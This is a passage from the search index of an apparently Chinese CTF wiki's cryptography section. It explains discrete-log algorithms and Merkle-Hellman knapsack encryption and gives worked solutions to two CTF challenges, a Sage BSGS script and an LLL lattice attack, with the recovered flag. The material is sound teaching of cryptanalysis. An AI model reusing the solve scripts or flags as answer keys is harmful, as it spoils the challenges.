\u4e2d\uff0c\u5219\u8bf4\u660e\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a\u78b0\u649e\uff0c\u8fdb\u800c\u5f97\u5230\u4e86 i \u548c j\u3002 \u8fd9\u663e\u7136\u662f\u4e00\u4e2a\u65f6\u95f4\u4e0e\u7a7a\u95f4\u7684\u6298\u4e2d\u7684\u65b9\u5f0f\uff0c\u6211\u4eec\u5c06\u4e00\u4e2a O(n) O(n) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\uff0c O(1) O(1) \u7a7a\u95f4\u590d\u6742\u5ea6\u7684\u7b97\u6cd5\u8f6c\u6362\u4e3a\u4e86\u4e00\u4e2a O(\\sqrt n) O(\\sqrt n) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548c O(\\sqrt n) O(\\sqrt n) \u7684\u7a7a\u95f4\u590d\u6742\u5ea6\u7684\u7b97\u6cd5\u3002 \u5176\u4e2d \u6bcf\u4e00\u6b21 j \u7684\u589e\u52a0\u8868\u793a\u201cbaby-step\u201d\uff0c\u4e00\u6b21\u4e58\u4e0a g\u3002 \u6bcf\u4e00\u6b21 i \u7684\u589e\u52a0\u8868\u793a\u201cgiant-step\u201d\uff0c\u4e00\u6b21\u4e58\u4e0a g^{-m} g^{-m} \u3002","title":"Baby-step giant-step"},{"location":"crypto/asymmetric/discrete-log/integer_field/#pollards-algorithm","text":"\u6211\u4eec\u53ef\u4ee5\u4ee5 O(\\sqrt n) O(\\sqrt n) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548c O(1) O(1) \u7684\u7a7a\u95f4\u590d\u6742\u5ea6\u6765\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\u3002\u5177\u4f53\u539f\u7406\u8bf7\u81ea\u884c\u8c37\u6b4c\u3002","title":"Pollard\u2019s \u03c1 algorithm"},{"location":"crypto/asymmetric/discrete-log/integer_field/#pollards-kangaroo-algorithm","text":"\u5982\u679c\u6211\u4eec\u77e5\u9053 x \u7684\u8303\u56f4\u4e3a a \\leq x \\leq b a \\leq x \\leq b \uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4ee5 O(\\sqrt {(b-a)}) O(\\sqrt {(b-a)}) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\u3002\u5177\u4f53\u539f\u7406\u8bf7\u81ea\u884c\u8c37\u6b4c\u3002","title":"Pollard\u2019s kangaroo algorithm"},{"location":"crypto/asymmetric/discrete-log/integer_field/#the-pohlig-hellman-algorithm","text":"\u4e0d\u59a8\u5047\u8bbe\u4e0a\u8ff0\u6240\u63d0\u5230\u7684\u7fa4\u7684\u9636\u4e3a n\uff0c n \u4e3a\u4e00\u4e2a\u5149\u6ed1\u6570\uff0c\u4e14 n=\\prod_{i=1}^r p_i^{e_i} n=\\prod_{i=1}^r p_i^{e_i} \u5bf9\u4e8e\u6bcf\u4e2a $i \\in {1,...,r} $ \u8ba1\u7b97 g_i=g^{\\frac{n}{p_i^{e_i}}} g_i=g^{\\frac{n}{p_i^{e_i}}} \uff0c g_i g_i \u5728\u6a21 m \u4e2d\u7684\u9636\u4e3a p_i^{e_i} p_i^{e_i} \uff0c\u8fd9\u4e2a\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002 \u8ba1\u7b97 y_i=y^{\\frac{n}{p_i^{e_i}}}=g^{\\frac{xn}{p_i^{e_i}}}=g_i^{x}=g_i^{x \\bmod p_i^{e_i}} =g_i^{r_i}\\bmod m y_i=y^{\\frac{n}{p_i^{e_i}}}=g^{\\frac{xn}{p_i^{e_i}}}=g_i^{x}=g_i^{x \\bmod p_i^{e_i}} =g_i^{r_i}\\bmod m \uff0c\u8fd9\u91cc\u6211\u4eec\u77e5\u9053 y_i,m,g_i y_i,m,g_i \uff0c\u800c r_i r_i \u7684\u8303\u56f4\u4e3a [0,p_i^{e_i}] [0,p_i^{e_i}] \uff0c\u7531n \u662f\u4e00\u4e2a\u5149\u6ed1\u6570\uff0c\u53ef\u77e5\u5176\u8303\u56f4\u8f83\u5c0f\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Pollard\u2019s kangaroo algorithm \u7b49\u65b9\u6cd5\u5feb\u901f\u6c42\u5f97 r_i r_i \u3002 \u6839\u636e\u4e0a\u8ff0\u7684\u63a8\u5bfc\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5bf9\u4e8e i \\in \\{1,...,r\\} i \\in \\{1,...,r\\} \uff0c x \\equiv r_i \\bmod p_i^{e_i} x \\equiv r_i \\bmod p_i^{e_i} \u3002 \u6839\u636e\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u53ef\u5f97\uff0c x \\equiv ans \\bmod n x \\equiv ans \\bmod n \u3002 \u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u4f5c\u4e3a\u7528\u4e0b\u56fe\u89e3\u91ca \u5f53\u7136\uff0c\u539f\u6587\u4e2d\u6709\u4e00\u4e9b\u4f18\u96c5\u7684\u505a\u6cd5\uff0c\u8fd9\u91cc\u53ea\u662f\u7ed9\u51fa\u601d\u60f3\u3002 \u5176\u590d\u6742\u5ea6\u4e3a O(\\sum\\limits _i e_i(log_2 n+\\sqrt p_i)) O(\\sum\\limits _i e_i(log_2 n+\\sqrt p_i)) \uff0c\u53ef\u4ee5\u770b\u51fa\u590d\u6742\u5ea6\u8fd8\u662f\u5f88\u4f4e\u7684\u3002 \u5982\u679c m=2n+1 m=2n+1 \uff0c\u5e76\u4e14 n \u662f\u4e00\u4e2a\u7d20\u6570\uff0c\u90a3\u4e48\u590d\u6742\u5ea6\u5c31\u548c\u539f\u6765\u7684 \\sqrt m \\sqrt m \u51e0\u4e4e\u6ca1\u6709\u5dee\u522b\u4e86\u3002\u3002","title":"The Pohlig-Hellman algorithm"},{"location":"crypto/asymmetric/discrete-log/integer_field/#2018-crackme-java","text":"\u4ee3\u7801\u5982\u4e0b import java.math.BigInteger ; import java.util.Random ; public class Test1 { static BigInteger two = new BigInteger ( \"2\" ); static BigInteger p = new BigInteger ( \"11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711\" ); static BigInteger h = new BigInteger ( \"7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916\" ); /* Alice write the below algorithm for encryption. The public key {p, h} is broadcasted to everyone. @param val: The plaintext to encrypt. We suppose val only contains lowercase letter {a-z} and numeric charactors, and is at most 256 charactors in length. */ public static String pkEnc ( String val ){ BigInteger [] ret = new BigInteger [ 2 ]; BigInteger bVal = new BigInteger ( val . toLowerCase (), 36 ); BigInteger r = new BigInteger ( new Random (). nextInt ()+ \"\" ); ret [ 0 ]= two . modPow ( r , p ); ret [ 1 ]= h . modPow ( r , p ). multiply ( bVal ); return ret [ 0 ]. toString ( 36 )+ \"==\" + ret [ 1 ]. toString ( 36 ); } /* Alice write the below algorithm for decryption. x is her private key, which she will never let you know. public static String skDec(String val,BigInteger x){ if(!val.contains(\"==\")){ return null; } else { BigInteger val0=new BigInteger(val.split(\"==\")[0],36); BigInteger val1=new BigInteger(val.split(\"==\")[1],36); BigInteger s=val0.modPow(x,p).modInverse(p); return val1.multiply(s).mod(p).toString(36); } } */ public static void main ( String [] args ) throws Exception { System . out . println ( \"You intercepted the following message, which is sent from Bob to Alice:\" ); BigInteger bVal1 = new BigInteger ( \"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco\" , 36 ); BigInteger bVal2 = new BigInteger ( \"2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\" , 36 ); BigInteger r = new BigInteger ( new Random (). nextInt ()+ \"\" ); System . out . println ( r ); System . out . println ( bVal1 ); System . out . println ( bVal2 ); System . out . println ( \"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco==2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\" ); System . out . println ( \"Please figure out the plaintext!\" ); } } \u57fa\u672c\u529f\u80fd\u4e3a\u8ba1\u7b97 r_0=2^r \\bmod p r_0=2^r \\bmod p r_1 =b*h^r \\bmod p r_1 =b*h^r \\bmod p \u53ef\u4ee5\u53d1\u73b0\uff0cr \u7684\u8303\u56f4\u4e3a [0,2^{32}] [0,2^{32}] \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 BSGS \u7b97\u6cd5\uff0c\u5982\u4e0b from sage.all import * c1 = int ( 'a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco' , 36 ) c2 = int ( '2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc' , 36 ) print c1 , c2 p = 11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711 h = 7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916 # generate the group const2 = 2 const2 = Mod ( const2 , p ) c1 = Mod ( c1 , p ) c2 = Mod ( c2 , p ) h = Mod ( h , p ) print '2' , bsgs ( const2 , c1 , bounds = ( 1 , 2 ^ 32 )) r = 152351913 num = long ( c2 / ( h ** r )) print num","title":"2018 \u56fd\u8d5b crackme java"},{"location":"crypto/asymmetric/discrete-log/integer_field/#_7","text":"\u521d\u7b49\u6570\u8bba\uff0c\u6f58\u627f\u6d1e\uff0c\u6f58\u627f\u5f6a https://ee.stanford.edu/~hellman/publications/28.pdf https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm#cite_note-Menezes97p108-2 https://fortenf.org/e/crypto/2017/12/03/survey-of-discrete-log-algos.html","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/knapsack/knapsack/","text":"\u80cc\u5305\u95ee\u9898 \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u4ecb\u7ecd\u4e00\u4e0b\u80cc\u5305\u95ee\u9898\uff0c\u5047\u5b9a\u4e00\u4e2a\u80cc\u5305\u53ef\u4ee5\u79f0\u91cd W\uff0c\u73b0\u5728\u6709 n \u4e2a\u7269\u54c1\uff0c\u5176\u91cd\u91cf\u5206\u522b\u4e3a a_1, a_2,...,a_n a_1, a_2,...,a_n \u6211\u4eec\u60f3\u95ee\u4e00\u4e0b\u88c5\u54ea\u4e9b\u7269\u54c1\u53ef\u4ee5\u6070\u597d\u4f7f\u5f97\u80cc\u5305\u88c5\u6ee1\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7269\u54c1\u53ea\u80fd\u88ab\u88c5\u4e00\u6b21\u3002\u8fd9\u5176\u5b9e\u5c31\u662f\u5728\u89e3\u8fd9\u6837\u7684\u4e00\u4e2a\u95ee\u9898 x_1a_1+x_2a_2+,...,+x_na_n=W x_1a_1+x_2a_2+,...,+x_na_n=W \u5176\u4e2d\u6240\u6709\u7684 x_i x_i \u53ea\u80fd\u4e3a 0 \u548c 1\u3002\u663e\u7136\u6211\u4eec\u5fc5\u987b\u679a\u4e3e\u6240\u6709\u7684 n \u4e2a\u7269\u54c1\u7684\u7ec4\u5408\u624d\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u800c\u590d\u6742\u5ea6\u4e5f\u5c31\u662f 2^n 2^n \uff0c\u8fd9\u4e5f\u5c31\u662f\u80cc\u5305\u52a0\u5bc6\u7684\u5999\u5904\u6240\u5728\u3002 \u5728\u52a0\u5bc6\u65f6\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a x\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u8868\u793a\u4e3a n \u4f4d\u4e8c\u8fdb\u5236\u6570\uff0c\u7136\u540e\u5206\u522b\u4e58\u4e0a a_i a_i \u5373\u53ef\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\u3002 \u4f46\u662f\u89e3\u5bc6\u7684\u65f6\u5019\uff0c\u8be5\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u786e\u5b9e\u8ba9\u5176\u4ed6\u4eba\u96be\u4ee5\u89e3\u5bc6\u5bc6\u6587\uff0c\u4f46\u662f\u6211\u4eec\u81ea\u5df1\u4e5f\u786e\u5b9e\u6ca1\u6709\u529e\u6cd5\u89e3\u5bc6\u5bc6\u6587\u3002 \u4f46\u662f\u5f53 a_i a_i \u662f\u8d85\u9012\u589e\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u6709\u529e\u6cd5\u89e3\u4e86\uff0c\u6240\u8c13\u8d85\u9012\u589e\u662f\u6307\u5e8f\u5217\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6 a_i>\\sum_{k=1}^{i-1}a_k a_i>\\sum_{k=1}^{i-1}a_k \u5373\u7b2c i \u4e2a\u6570\u5927\u4e8e\u524d\u9762\u6240\u6709\u6570\u7684\u548c\u3002 \u4e3a\u4ec0\u4e48\u6ee1\u8db3\u8fd9\u6837\u7684\u6761\u4ef6\u5c31\u53ef\u4ee5\u89e3\u5bc6\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u5982\u679c\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u5927\u4e8e a_n a_n \u7684\u8bdd\uff0c\u5176\u524d\u9762\u7684\u7cfb\u6570\u4e3a\u5fc5\u987b 1 \u7684\u3002\u53cd\u4e4b\uff0c\u65e0\u8bba\u5982\u4f55\u4e5f\u65e0\u6cd5\u4f7f\u5f97\u7b49\u5f0f\u6210\u7acb\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u7acb\u9a6c\u5f97\u5230\u5bf9\u5e94\u7684\u660e\u6587\u3002 \u4f46\u662f\uff0c\u8fd9\u6837\u53c8\u51fa\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u7531\u4e8e a_i a_i \u662f\u516c\u5f00\u7684\uff0c\u5982\u679c\u653b\u51fb\u8005\u622a\u83b7\u4e86\u5bc6\u6587\uff0c\u90a3\u4e48\u5b83\u4e5f\u5c31\u5f88\u5bb9\u6613\u53bb\u7834\u89e3\u8fd9\u6837\u7684\u5bc6\u7801\u3002\u4e3a\u4e86\u5f25\u8865\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u5c31\u51fa\u73b0\u4e86 Merkle\u2013Hellman \u8fd9\u6837\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u521d\u59cb\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u79c1\u94a5\uff0c\u53d8\u6362\u540e\u7684\u80cc\u5305\u96c6\u4f5c\u4e3a\u516c\u94a5\uff0c\u518d\u7a0d\u5fae\u6539\u52a8\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u5373\u53ef\u3002 \u8fd9\u91cc\u867d\u7136\u8bf4\u4e86\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u4f46\u662f\u5374\u6ca1\u6709\u8bf4\u662f\u5982\u4f55\u751f\u6210\u7684\u3002 Merkle\u2013Hellman \u00b6 \u516c\u79c1\u94a5\u751f\u6210 \u00b6 \u751f\u6210\u79c1\u94a5 \u00b6 \u79c1\u94a5\u5c31\u662f\u6211\u4eec\u7684\u521d\u59cb\u7684\u80cc\u5305\u96c6\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u600e\u4e48\u751f\u6210\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe a_1=1 a_1=1 \uff0c\u90a3\u4e48 a_2 a_2 \u5927\u4e8e 1 \u5373\u53ef\uff0c\u7c7b\u4f3c\u7684\u53ef\u4ee5\u4f9d\u6b21\u751f\u6210\u540e\u9762\u7684\u503c\u3002 \u751f\u6210\u516c\u94a5 \u00b6 \u5728\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\u4e2d\u4e3b\u8981\u4f7f\u7528\u4e86\u6a21\u4e58\u7684\u8fd0\u7b97\u3002 \u9996\u5148\uff0c\u6211\u4eec\u751f\u6210\u6a21\u4e58\u7684\u6a21\u6570 m\uff0c\u8fd9\u91cc\u8981\u786e\u4fdd m>\\sum_{i=1}^{i=n}a_i m>\\sum_{i=1}^{i=n}a_i \u5176\u6b21\uff0c\u6211\u4eec\u9009\u62e9\u6a21\u4e58\u7684\u4e58\u6570 w\uff0c\u4f5c\u4e3a\u79c1\u94a5\u5e76\u4e14\u786e\u4fdd gcd(w,m)=1 gcd(w,m)=1 \u4e4b\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u516c\u5f0f\u751f\u6210\u516c\u94a5 b_i \\equiv w a_i \\bmod m b_i \\equiv w a_i \\bmod m \u5e76\u5c06\u8fd9\u4e2a\u65b0\u7684\u80cc\u5305\u96c6 b_i b_i \u548c m \u4f5c\u4e3a\u516c\u94a5\u3002 \u52a0\u89e3\u5bc6 \u00b6 \u52a0\u5bc6 \u00b6 \u5047\u8bbe\u6211\u4eec\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a v\uff0c\u5176\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u4e3a v_i v_i \uff0c\u90a3\u4e48\u6211\u4eec\u52a0\u5bc6\u7684\u7ed3\u679c\u4e3a \\sum_{i=1}^{i=n}b_iv_i \\bmod m \\sum_{i=1}^{i=n}b_iv_i \\bmod m \u89e3\u5bc6 \u00b6 \u5bf9\u4e8e\u89e3\u5bc6\u65b9\uff0c\u9996\u5148\u53ef\u4ee5\u6c42\u7684 w \u5173\u4e8e m \u7684\u9006\u5143 w^{-1} w^{-1} \u3002 \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06\u5f97\u5230\u7684\u5bc6\u6587\u4e58\u4ee5 w^{-1} w^{-1} \u5373\u53ef\u5f97\u5230\u660e\u6587\uff0c\u8fd9\u662f\u56e0\u4e3a \\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m \\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m \u8fd9\u91cc\u6709 b_i \\equiv w a_i \\bmod m b_i \\equiv w a_i \\bmod m \u5bf9\u4e8e\u6bcf\u4e00\u5757\u7684\u52a0\u5bc6\u7684\u6d88\u606f\u90fd\u662f\u5c0f\u4e8e m \u7684\uff0c\u6240\u4ee5\u6c42\u5f97\u7ed3\u679c\u81ea\u7136\u4e5f\u5c31\u662f\u660e\u6587\u4e86\u3002 \u7834\u89e3 \u00b6 \u8be5\u52a0\u5bc6\u4f53\u5236\u5728\u63d0\u51fa\u540e\u4e24\u5e74\u540e\u8be5\u4f53\u5236\u5373\u88ab\u7834\u8bd1\uff0c\u7834\u8bd1\u7684\u57fa\u672c\u601d\u60f3\u662f\u6211\u4eec\u4e0d\u4e00\u5b9a\u8981\u627e\u51fa\u6b63\u786e\u7684\u4e58\u6570 w\uff08\u5373\u9677\u95e8\u4fe1\u606f\uff09\uff0c\u53ea\u9700\u627e\u51fa\u4efb\u610f\u6a21\u6570 m\u2032 \u548c\u4e58\u6570 w\u2032 \uff0c\u53ea\u8981\u4f7f\u7528 w\u2032 \u53bb\u4e58\u516c\u5f00\u7684\u80cc\u5305\u5411\u91cf B \u65f6\uff0c\u80fd\u591f\u4ea7\u751f\u8d85\u9012\u589e\u7684\u80cc\u5305\u5411\u91cf\u5373\u53ef\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 2014 \u5e74 ASIS Cyber Security Contest Quals \u4e2d\u7684 Archaic \u4e3a\u4f8b\uff0c \u9898\u76ee\u94fe\u63a5 \u3002 \u9996\u5148\u67e5\u770b\u6e90\u7a0b\u5e8f secret = 'CENSORED' msg_bit = bin ( int ( secret . encode ( 'hex' ), 16 ))[ 2 :] \u9996\u5148\u5f97\u5230\u4e86 secret \u7684\u6240\u6709\u4e8c\u8fdb\u5236\u4f4d\u3002 \u5176\u6b21\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u5f97\u5230 keypair\uff0c\u5305\u542b\u516c\u94a5\u4e0e\u79c1\u94a5\u3002 keyPair = makeKey ( len ( msg_bit )) \u4ed4\u7ec6\u5206\u6790 makekey \u51fd\u6570\uff0c\u5982\u4e0b def makeKey ( n ): privKey = [ random . randint ( 1 , 4 ** n )] s = privKey [ 0 ] for i in range ( 1 , n ): privKey . append ( random . randint ( s + 1 , 4 ** ( n + i ))) s += privKey [ i ] q = random . randint ( privKey [ n - 1 ] + 1 , 2 * privKey [ n - 1 ]) r = random . randint ( 1 , q ) while gmpy2 . gcd ( r , q ) != 1 : r = random . randint ( 1 , q ) pubKey = [ r * w % q for w in privKey ] return privKey , q , r , pubKey \u53ef\u4ee5\u770b\u51fa prikey \u662f\u4e00\u4e2a\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u5e76\u4e14\u5f97\u5230\u7684 q \u6bd4 prikey \u4e2d\u6240\u6709\u6570\u7684\u548c\u8fd8\u8981\u5927\uff0c\u6b64\u5916\u6211\u4eec\u5f97\u5230\u7684 r\uff0c\u6070\u597d\u4e0e q \u4e92\u7d20\uff0c\u8fd9\u4e00\u5207\u90fd\u8868\u660e\u4e86\u8be5\u52a0\u5bc6\u662f\u4e00\u4e2a\u80cc\u5305\u52a0\u5bc6\u3002 \u679c\u7136\u52a0\u5bc6\u51fd\u6570\u5c31\u662f\u5bf9\u4e8e\u6d88\u606f\u7684\u6bcf\u4e00\u4f4d\u4e58\u4ee5\u5bf9\u5e94\u7684\u516c\u94a5\u5e76\u6c42\u548c\u3002 def encrypt ( msg , pubKey ): msg_bit = msg n = len ( pubKey ) cipher = 0 i = 0 for bit in msg_bit : cipher += int ( bit ) * pubKey [ i ] i += 1 return bin ( cipher )[ 2 :] \u5bf9\u4e8e\u7834\u89e3\u7684\u811a\u672c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 GitHub \u4e0a\u7684\u811a\u672c\u3002\u8fdb\u884c\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\u3002 import binascii # open the public key and strip the spaces so we have a decent array fileKey = open ( \"pub.Key\" , 'rb' ) pubKey = fileKey . read () . replace ( ' ' , '' ) . replace ( 'L' , '' ) . strip ( '[]' ) . split ( ',' ) nbit = len ( pubKey ) # open the encoded message fileEnc = open ( \"enc.txt\" , 'rb' ) encoded = fileEnc . read () . replace ( 'L' , '' ) print \"start\" # create a large matrix of 0's (dimensions are public key length +1) A = Matrix ( ZZ , nbit + 1 , nbit + 1 ) # fill in the identity matrix for i in xrange ( nbit ): A [ i , i ] = 1 # replace the bottom row with your public key for i in xrange ( nbit ): A [ i , nbit ] = pubKey [ i ] # last element is the encoded message A [ nbit , nbit ] = - int ( encoded ) res = A . LLL () for i in range ( 0 , nbit + 1 ): # print solution M = res . row ( i ) . list () flag = True for m in M : if m != 0 and m != 1 : flag = False break if flag : print i , M M = '' . join ( str ( j ) for j in M ) # remove the last bit M = M [: - 1 ] M = hex ( int ( M , 2 ))[ 2 : - 1 ] print M \u8f93\u51fa\u4e4b\u540e\u518d\u89e3\u7801\u4e0b 295 [ 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 ] 415349535 f3962643364356664323432323638326331393536383830366130373036316365 >>> import binascii >>> binascii . unhexlify ( '415349535f3962643364356664323432323638326331393536383830366130373036316365' ) 'ASIS_9bd3d5fd2422682c19568806a07061ce' \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5f97\u5230\u7684 LLL \u653b\u51fb\u5f97\u5230\u7684\u77e9\u9635 res \u7684\u53ea\u5305\u542b 01 \u503c\u7684\u884c\u624d\u662f\u6211\u4eec\u60f3\u8981\u7684\u7ed3\u679c\uff0c\u56e0\u4e3a\u6211\u4eec\u5bf9\u4e8e\u660e\u6587\u52a0\u5bc6\u65f6\uff0c\u4f1a\u5c06\u5176\u5206\u89e3\u4e3a\u4e8c\u8fdb\u5236\u6bd4\u7279\u4e32\u3002\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u53bb\u6389\u5bf9\u5e94\u54ea\u4e00\u884c\u7684\u6700\u540e\u4e00\u4e2a\u6570\u5b57\u3002 flag \u662f ASIS_9bd3d5fd2422682c19568806a07061ce \u3002 \u9898\u76ee \u00b6 2017 \u56fd\u8d5b classic","title":"\u80cc\u5305\u52a0\u5bc6"},{"location":"crypto/asymmetric/knapsack/knapsack/#_1","text":"\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u4ecb\u7ecd\u4e00\u4e0b\u80cc\u5305\u95ee\u9898\uff0c\u5047\u5b9a\u4e00\u4e2a\u80cc\u5305\u53ef\u4ee5\u79f0\u91cd W\uff0c\u73b0\u5728\u6709 n \u4e2a\u7269\u54c1\uff0c\u5176\u91cd\u91cf\u5206\u522b\u4e3a a_1, a_2,...,a_n a_1, a_2,...,a_n \u6211\u4eec\u60f3\u95ee\u4e00\u4e0b\u88c5\u54ea\u4e9b\u7269\u54c1\u53ef\u4ee5\u6070\u597d\u4f7f\u5f97\u80cc\u5305\u88c5\u6ee1\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7269\u54c1\u53ea\u80fd\u88ab\u88c5\u4e00\u6b21\u3002\u8fd9\u5176\u5b9e\u5c31\u662f\u5728\u89e3\u8fd9\u6837\u7684\u4e00\u4e2a\u95ee\u9898 x_1a_1+x_2a_2+,...,+x_na_n=W x_1a_1+x_2a_2+,...,+x_na_n=W \u5176\u4e2d\u6240\u6709\u7684 x_i x_i \u53ea\u80fd\u4e3a 0 \u548c 1\u3002\u663e\u7136\u6211\u4eec\u5fc5\u987b\u679a\u4e3e\u6240\u6709\u7684 n \u4e2a\u7269\u54c1\u7684\u7ec4\u5408\u624d\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u800c\u590d\u6742\u5ea6\u4e5f\u5c31\u662f 2^n 2^n \uff0c\u8fd9\u4e5f\u5c31\u662f\u80cc\u5305\u52a0\u5bc6\u7684\u5999\u5904\u6240\u5728\u3002 \u5728\u52a0\u5bc6\u65f6\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a x\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u8868\u793a\u4e3a n 